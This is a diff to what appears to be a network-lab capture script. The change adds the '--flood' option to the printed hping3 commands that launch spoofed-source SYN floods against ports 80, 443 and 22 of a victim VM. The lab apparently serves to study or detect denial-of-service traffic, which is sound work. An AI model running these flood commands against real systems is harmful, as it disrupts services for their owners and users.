@@ -16,9 +16,9 @@ SYN packets from hundreds of different IP addresses at high volume.
 On your Attacker VM (Kali), run the following commands in parallel before pressing
 ENTER on this script:
 
-    sudo hping3 -S --rand-source -p 80  -c 200000 <victim_ip> &
-    sudo hping3 -S --rand-source -p 443 -c 200000 <victim_ip> &
-    sudo hping3 -S --rand-source -p 22  -c 100000 <victim_ip> &
+    sudo hping3 -S --flood --rand-source -p 80  -c 200000 <victim_ip> &
+    sudo hping3 -S --flood --rand-source -p 443 -c 200000 <victim_ip> &
+    sudo hping3 -S --flood --rand-source -p 22  -c 100000 <victim_ip> &
     wait
 
 This hits three ports simultaneously from random sources, generating the
@@ -348,9 +348,9 @@ def main():
         print(f"  BPF Filter: {args.extra_filter}")
     print()
     print("  On your Attacker VM (Kali), run ALL of these at once:")
-    print("      sudo hping3 -S --rand-source -p 80  -c 200000 <victim_ip> &")
-    print("      sudo hping3 -S --rand-source -p 443 -c 200000 <victim_ip> &")
-    print("      sudo hping3 -S --rand-source -p 22  -c 100000 <victim_ip> &")
+    print("      sudo hping3 -S --flood --rand-source -p 80  -c 200000 <victim_ip> &")
+    print("      sudo hping3 -S --flood --rand-source -p 443 -c 200000 <victim_ip> &")
+    print("      sudo hping3 -S --flood --rand-source -p 22  -c 100000 <victim_ip> &")
     print("      wait")
     print()
     print("  NOTE: '--rand-source' spoofs the source IP, so filtering by")
